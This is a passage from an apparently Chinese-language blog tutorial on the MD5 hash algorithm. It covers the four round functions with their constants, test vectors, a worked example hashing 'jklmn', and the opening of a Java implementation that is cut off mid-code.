class="line"></span><br><span class="line">FF(a ,b ,c ,d ,M4 ,7 ,0xf57c0faf )</span><br><span class="line"></span><br><span class="line">FF(d ,a ,b ,c ,M5 ,12 ,0x4787c62a )</span><br><span class="line"></span><br><span class="line">FF(c ,d ,a ,b ,M6 ,17 ,0xa8304613 )</span><br><span class="line"></span><br><span class="line">FF(b ,c ,d ,a ,M7 ,22 ,0xfd469501)</span><br><span class="line"></span><br><span class="line">FF(a ,b ,c ,d ,M8 ,7 ,0x698098d8 )</span><br><span class="line"></span><br><span class="line">FF(d ,a ,b ,c ,M9 ,12 ,0x8b44f7af )</span><br><span class="line"></span><br><span class="line">FF(c ,d ,a ,b ,M10 ,17 ,0xffff5bb1 )</span><br><span class="line"></span><br><span class="line">FF(b ,c ,d ,a ,M11 ,22 ,0x895cd7be )</span><br><span class="line"></span><br><span class="line">FF(a ,b ,c ,d ,M12 ,7 ,0x6b901122 )</span><br><span class="line"></span><br><span class="line">FF(d ,a ,b ,c ,M13 ,12 ,0xfd987193 )</span><br><span class="line"></span><br><span class="line">FF(c ,d ,a ,b ,M14 ,17 ,0xa679438e )</span><br><span class="line"></span><br><span class="line">FF(b ,c ,d ,a ,M15 ,22 ,0x49b40821 )</span><br></pre></td></tr></table></figure>

<h6 id="第二轮"><a href="#第二轮" class="headerlink" title="第二轮"></a>第二轮</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">GG(a ,b ,c ,d ,M1 ,5 ,0xf61e2562 )</span><br><span class="line"></span><br><span class="line">GG(d ,a ,b ,c ,M6 ,9 ,0xc040b340 )</span><br><span class="line"></span><br><span class="line">GG(c ,d ,a ,b ,M11 ,14 ,0x265e5a51 )</span><br><span class="line"></span><br><span class="line">GG(b ,c ,d ,a ,M0 ,20 ,0xe9b6c7aa )</span><br><span class="line"></span><br><span class="line">GG(a ,b ,c ,d ,M5 ,5 ,0xd62f105d )</span><br><span class="line"></span><br><span class="line">GG(d ,a ,b ,c ,M10 ,9 ,0x02441453 )</span><br><span class="line"></span><br><span class="line">GG(c ,d ,a ,b ,M15 ,14 ,0xd8a1e681 )</span><br><span class="line"></span><br><span class="line">GG(b ,c ,d ,a ,M4 ,20 ,0xe7d3fbc8 )</span><br><span class="line"></span><br><span class="line">GG(a ,b ,c ,d ,M9 ,5 ,0x21e1cde6 )</span><br><span class="line"></span><br><span class="line">GG(d ,a ,b ,c ,M14 ,9 ,0xc33707d6 )</span><br><span class="line"></span><br><span class="line">GG(c ,d ,a ,b ,M3 ,14 ,0xf4d50d87 )</span><br><span class="line"></span><br><span class="line">GG(b ,c ,d ,a ,M8 ,20 ,0x455a14ed )</span><br><span class="line"></span><br><span class="line">GG(a ,b ,c ,d ,M13 ,5 ,0xa9e3e905 )</span><br><span class="line"></span><br><span class="line">GG(d ,a ,b ,c ,M2 ,9 ,0xfcefa3f8 )</span><br><span class="line"></span><br><span class="line">GG(c ,d ,a ,b ,M7 ,14 ,0x676f02d9 )</span><br><span class="line"></span><br><span class="line">GG(b ,c ,d ,a ,M12 ,20 ,0x8d2a4c8a )</span><br></pre></td></tr></table></figure>

<h6 id="第三轮"><a href="#第三轮" class="headerlink" title="第三轮"></a>第三轮</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">HH(a ,b ,c ,d ,M5 ,4 ,0xfffa3942 )</span><br><span class="line"></span><br><span class="line">HH(d ,a ,b ,c ,M8 ,11 ,0x8771f681 )</span><br><span class="line"></span><br><span class="line">HH(c ,d ,a ,b ,M11 ,16 ,0x6d9d6122 )</span><br><span class="line"></span><br><span class="line">HH(b ,c ,d ,a ,M14 ,23 ,0xfde5380c )</span><br><span class="line"></span><br><span class="line">HH(a ,b ,c ,d ,M1 ,4 ,0xa4beea44 )</span><br><span class="line"></span><br><span class="line">HH(d ,a ,b ,c ,M4 ,11 ,0x4bdecfa9 )</span><br><span class="line"></span><br><span class="line">HH(c ,d ,a ,b ,M7 ,16 ,0xf6bb4b60 )</span><br><span class="line"></span><br><span class="line">HH(b ,c ,d ,a ,M10 ,23 ,0xbebfbc70 )</span><br><span class="line"></span><br><span class="line">HH(a ,b ,c ,d ,M13 ,4 ,0x289b7ec6 )</span><br><span class="line"></span><br><span class="line">HH(d ,a ,b ,c ,M0 ,11 ,0xeaa127fa )</span><br><span class="line"></span><br><span class="line">HH(c ,d ,a ,b ,M3 ,16 ,0xd4ef3085 )</span><br><span class="line"></span><br><span class="line">HH(b ,c ,d ,a ,M6 ,23 ,0x04881d05 )</span><br><span class="line"></span><br><span class="line">HH(a ,b ,c ,d ,M9 ,4 ,0xd9d4d039 )</span><br><span class="line"></span><br><span class="line">HH(d ,a ,b ,c ,M12 ,11 ,0xe6db99e5 )</span><br><span class="line"></span><br><span class="line">HH(c ,d ,a ,b ,M15 ,16 ,0x1fa27cf8 )</span><br><span class="line"></span><br><span class="line">HH(b ,c ,d ,a ,M2 ,23 ,0xc4ac5665 )</span><br></pre></td></tr></table></figure>

<h6 id="第四轮"><a href="#第四轮" class="headerlink" title="第四轮"></a>第四轮</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">II(a ,b ,c ,d ,M0 ,6 ,0xf4292244 )</span><br><span class="line"></span><br><span class="line">II(d ,a ,b ,c ,M7 ,10 ,0x432aff97 )</span><br><span class="line"></span><br><span class="line">II(c ,d ,a ,b ,M14 ,15 ,0xab9423a7 )</span><br><span class="line"></span><br><span class="line">II(b ,c ,d ,a ,M5 ,21 ,0xfc93a039 )</span><br><span class="line"></span><br><span class="line">II(a ,b ,c ,d ,M12 ,6 ,0x655b59c3 )</span><br><span class="line"></span><br><span class="line">II(d ,a ,b ,c ,M3 ,10 ,0x8f0ccc92 )</span><br><span class="line"></span><br><span class="line">II(c ,d ,a ,b ,M10 ,15 ,0xffeff47d )</span><br><span class="line"></span><br><span class="line">II(b ,c ,d ,a ,M1 ,21 ,0x85845dd1 )</span><br><span class="line"></span><br><span class="line">II(a ,b ,c ,d ,M8 ,6 ,0x6fa87e4f )</span><br><span class="line"></span><br><span class="line">II(d ,a ,b ,c ,M15 ,10 ,0xfe2ce6e0 )</span><br><span class="line"></span><br><span class="line">II(c ,d ,a ,b ,M6 ,15 ,0xa3014314 )</span><br><span class="line"></span><br><span class="line">II(b ,c ,d ,a ,M13 ,21 ,0x4e0811a1 )</span><br><span class="line"></span><br><span class="line">II(a ,b ,c ,d ,M4 ,6 ,0xf7537e82 )</span><br><span class="line"></span><br><span class="line">II(d ,a ,b ,c ,M11 ,10 ,0xbd3af235 )</span><br><span class="line"></span><br><span class="line">II(c ,d ,a ,b ,M2 ,15 ,0x2ad7d2bb )</span><br><span class="line"></span><br><span class="line">II(b ,c ,d ,a ,M9 ,21 ,0xeb86d391 )</span><br></pre></td></tr></table></figure>

<h6 id="所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。"><a href="#所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。" class="headerlink" title="所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。"></a>所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。</h6><h6 id="即a-a-A，b-b-B，c-c-C，d-d-D"><a href="#即a-a-A，b-b-B，c-c-C，d-d-D" class="headerlink" title="即a = a + A，b = b + B，c = c + C，d = d + D"></a>即a = a + A，b = b + B，c = c + C，d = d + D</h6><h6 id="然后用下一分组数据继续运行以上算法。"><a href="#然后用下一分组数据继续运行以上算法。" class="headerlink" title="然后用下一分组数据继续运行以上算法。"></a>然后用下一分组数据继续运行以上算法。</h6><h6 id="4-输出"><a href="#4-输出" class="headerlink" title="4.输出"></a>4.输出</h6><h6 id="最后的输出是a、b、c和d的级联。"><a href="#最后的输出是a、b、c和d的级联。" class="headerlink" title="最后的输出是a、b、c和d的级联。"></a>最后的输出是a、b、c和d的级联。</h6><h6 id="当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。"><a href="#当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。" class="headerlink" title="当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。"></a>当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。</h6><h6 id="MD5-“”-d41d8cd98f00b204e9800998ecf8427e"><a href="#MD5-“”-d41d8cd98f00b204e9800998ecf8427e" class="headerlink" title="MD5(“”) = d41d8cd98f00b204e9800998ecf8427e"></a>MD5(“”) = d41d8cd98f00b204e9800998ecf8427e</h6><h6 id="MD5-“a”-0cc175b9c0f1b6a831c399e269772661"><a href="#MD5-“a”-0cc175b9c0f1b6a831c399e269772661" class="headerlink" title="MD5(“a”) = 0cc175b9c0f1b6a831c399e269772661"></a>MD5(“a”) = 0cc175b9c0f1b6a831c399e269772661</h6><h6 id="MD5-“abc”-900150983cd24fb0d6963f7d28e17f72"><a href="#MD5-“abc”-900150983cd24fb0d6963f7d28e17f72" class="headerlink" title="MD5(“abc”) = 900150983cd24fb0d6963f7d28e17f72"></a>MD5(“abc”) = 900150983cd24fb0d6963f7d28e17f72</h6><h6 id="MD5-“message-digest”-f96b697d7cb7938d525a2f31aaf161d0"><a href="#MD5-“message-digest”-f96b697d7cb7938d525a2f31aaf161d0" class="headerlink" title="MD5(“message digest”) = f96b697d7cb7938d525a2f31aaf161d0"></a>MD5(“message digest”) = f96b697d7cb7938d525a2f31aaf161d0</h6><h6 id="MD5-“abcdefghijklmnopqrstuvwxyz”-c3fcd3d76192e4007dfb496cca67e13b"><a href="#MD5-“abcdefghijklmnopqrstuvwxyz”-c3fcd3d76192e4007dfb496cca67e13b" class="headerlink" title="MD5(“abcdefghijklmnopqrstuvwxyz”) = c3fcd3d76192e4007dfb496cca67e13b"></a>MD5(“abcdefghijklmnopqrstuvwxyz”) = c3fcd3d76192e4007dfb496cca67e13b</h6><h6 id="MD5-“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”"><a href="#MD5-“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”" class="headerlink" title="MD5(“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”) ="></a>MD5(“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”) =</h6><h6 id="f29939a25efabaef3b87e2cbfe641315"><a href="#f29939a25efabaef3b87e2cbfe641315" class="headerlink" title="f29939a25efabaef3b87e2cbfe641315"></a>f29939a25efabaef3b87e2cbfe641315</h6><h6 id="MD5-“8a683566bcc7801226b3d8b0cf35fd97”-cf2cb5c89c5e5eeebef4a76becddfcfd"><a href="#MD5-“8a683566bcc7801226b3d8b0cf35fd97”-cf2cb5c89c5e5eeebef4a76becddfcfd" class="headerlink" title="MD5(“8a683566bcc7801226b3d8b0cf35fd97”) =cf2cb5c89c5e5eeebef4a76becddfcfd"></a>MD5(“8a683566bcc7801226b3d8b0cf35fd97”) =cf2cb5c89c5e5eeebef4a76becddfcfd</h6><h6 id="MD5加密字符串实例"><a href="#MD5加密字符串实例" class="headerlink" title="MD5加密字符串实例"></a>MD5加密字符串实例</h6><h6 id="现以字符串jklmn为例。"><a href="#现以字符串jklmn为例。" class="headerlink" title="现以字符串jklmn为例。"></a>现以字符串<code>jklmn</code>为例。</h6><h6 id="该字符串在内存中表示为：6A-6B-6C-6D-6E-从左到右为低地址到高地址，后同-，信息长度为40-bits，即0x28。"><a href="#该字符串在内存中表示为：6A-6B-6C-6D-6E-从左到右为低地址到高地址，后同-，信息长度为40-bits，即0x28。" class="headerlink" title="该字符串在内存中表示为：6A 6B 6C 6D 6E(从左到右为低地址到高地址，后同)，信息长度为40 bits，即0x28。"></a>该字符串在内存中表示为：<code>6A 6B 6C 6D 6E</code>(从左到右为低地址到高地址，后同)，信息长度为40 bits，即0x28。</h6><h6 id="对其填充，填充至448位，即56字节。结果为："><a href="#对其填充，填充至448位，即56字节。结果为：" class="headerlink" title="对其填充，填充至448位，即56字节。结果为："></a>对其填充，填充至448位，即56字节。结果为：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6A 6B 6C 6D 6E 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<h6 id="剩下64位，即8字节填充填充前的信息拉长，按小段字节序填充剩下的8字节，结果为。"><a href="#剩下64位，即8字节填充填充前的信息拉长，按小段字节序填充剩下的8字节，结果为。" class="headerlink" title="剩下64位，即8字节填充填充前的信息拉长，按小段字节序填充剩下的8字节，结果为。"></a>剩下64位，即8字节填充填充前的信息拉长，按小段字节序填充剩下的8字节，结果为。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6A 6B 6C 6D 6E 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<h6 id="64字节，512-bits"><a href="#64字节，512-bits" class="headerlink" title="(64字节，512 bits)"></a>(64字节，512 bits)</h6><h6 id="初始化A，B，C，D四个变量。"><a href="#初始化A，B，C，D四个变量。" class="headerlink" title="初始化A，B，C，D四个变量。"></a>初始化A，B，C，D四个变量。</h6><h6 id="将这64字节填充后数据分成16个小组-程序中对应为16个数组-，即："><a href="#将这64字节填充后数据分成16个小组-程序中对应为16个数组-，即：" class="headerlink" title="将这64字节填充后数据分成16个小组(程序中对应为16个数组)，即："></a>将这64字节填充后数据分成16个小组(程序中对应为16个数组)，即：</h6><h6 id="M0-6A-6B-6C-6D-这是内存中的顺序，按照小端字节序原则，对应数组M-0-的值为0x6D6C6B6A，下同"><a href="#M0-6A-6B-6C-6D-这是内存中的顺序，按照小端字节序原则，对应数组M-0-的值为0x6D6C6B6A，下同" class="headerlink" title="M0:6A 6B 6C 6D(这是内存中的顺序，按照小端字节序原则，对应数组M(0)的值为0x6D6C6B6A，下同)"></a>M0:6A 6B 6C 6D(这是内存中的顺序，按照小端字节序原则，对应数组M(0)的值为0x6D6C6B6A，下同)</h6><h6 id="M1-6E-80-00-00"><a href="#M1-6E-80-00-00" class="headerlink" title="M1:6E 80 00 00"></a>M1:6E 80 00 00</h6><h6 id="M2-00-00-00-00"><a href="#M2-00-00-00-00" class="headerlink" title="M2:00 00 00 00"></a>M2:00 00 00 00</h6><h6 id="……"><a href="#……" class="headerlink" title="……"></a>……</h6><h6 id="M14-28-00-00-00"><a href="#M14-28-00-00-00" class="headerlink" title="M14:28 00 00 00"></a>M14:28 00 00 00</h6><h6 id="M15-00-00-00-00"><a href="#M15-00-00-00-00" class="headerlink" title="M15:00 00 00 00"></a>M15:00 00 00 00</h6><h6 id="经过3-分组数据处理后，a-b-c-d值分别为0xD8523F60-0x837E0144-0x517726CA-0x1BB6E5FE"><a href="#经过3-分组数据处理后，a-b-c-d值分别为0xD8523F60-0x837E0144-0x517726CA-0x1BB6E5FE" class="headerlink" title="经过3.分组数据处理后，a,b,c,d值分别为0xD8523F60,0x837E0144,0x517726CA,0x1BB6E5FE"></a>经过<code>3.分组数据处理</code>后，a,b,c,d值分别为0xD8523F60,0x837E0144,0x517726CA,0x1BB6E5FE</h6><h6 id="在内存中为："><a href="#在内存中为：" class="headerlink" title="在内存中为："></a>在内存中为：</h6><h6 id="a-60-3F-52-D8"><a href="#a-60-3F-52-D8" class="headerlink" title="a: 60 3F 52 D8"></a>a: 60 3F 52 D8</h6><h6 id="b：44-01-7E-83"><a href="#b：44-01-7E-83" class="headerlink" title="b：44 01 7E 83"></a>b：44 01 7E 83</h6><h6 id="c：CA-26-77-51"><a href="#c：CA-26-77-51" class="headerlink" title="c：CA 26 77 51"></a>c：CA 26 77 51</h6><h6 id="d：FE-E5-B6-1B"><a href="#d：FE-E5-B6-1B" class="headerlink" title="d：FE E5 B6 1B"></a>d：FE E5 B6 1B</h6><h6 id="a-b-c-d按内存顺序输出即为最终结果：603F52D844017E83CA267751FEE5B61B。就是字符串jklmn的md5值。"><a href="#a-b-c-d按内存顺序输出即为最终结果：603F52D844017E83CA267751FEE5B61B。就是字符串jklmn的md5值。" class="headerlink" title="a,b,c,d按内存顺序输出即为最终结果：603F52D844017E83CA267751FEE5B61B。就是字符串jklmn的md5值。"></a>a,b,c,d按内存顺序输出即为最终结果：603F52D844017E83CA267751FEE5B61B。就是字符串<code>jklmn</code>的md5值。</h6><h5 id="0x003-代码实现MD5转换器"><a href="#0x003-代码实现MD5转换器" class="headerlink" title="0x003 代码实现MD5转换器"></a>0x003 代码实现MD5转换器</h5><h6 id="java实现MD5："><a href="#java实现MD5：" class="headerlink" title="java实现MD5："></a>java实现MD5：</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.liangjie.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MD5</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 四个链接变量</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> A = <span class="number">0x67452301</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> B = <span class="number">0xefcdab89</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> C = <span class="number">0x98badcfe</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> D = <span class="number">0x10325476</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * ABCD的临时变量</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> Atemp, Btemp, Ctemp, Dtemp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 常量ti公式：floor(abs(sin(i+1))x(2pow32))</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> K[] = &#123; <span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span>, <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>,</span><br><span class="line">			<span class="number">0xfd469501</span>, <span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span>, <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span>,</span><br><span class="line">			<span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span>, <span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span>, <span class="number">0x21e1cde6</span>,</span><br><span class="line">			<span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span>, <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span>, <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>,</span><br><span class="line">			<span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span>, <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span>, <span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>,</span><br><span class="line">			<span class="number">0x04881d05</span>, <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span>, <span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span>,</span><br><span class="line">			<span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span>, <span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span>, <span class="number">0xf7537e82</span>,</span><br><span class="line">			<span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 向左位移数，计算方法未知</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> s[] = &#123; <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,</span><br><span class="line">			<span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>,</span><br><span class="line">			<span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 初始化函数</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Atemp = A;</span><br><span class="line">		Btemp = B;</span><br><span class="line">		Ctemp = C;</span><br><span class="line">		Dtemp = D;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 移动一定位数</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">shift</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (a &lt;&lt; s) | (a &gt;&gt;&gt; (<span class="number">32</span> - s)); <span class="comment">// 右移的时候，高位一定要补零，而不是补充符号位</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 主循环</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">MainLoop</span><span class="params">(<span class="keyword">int</span> M[])</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> F, g;</span><br><span class="line">		<span class="keyword">int</span> a 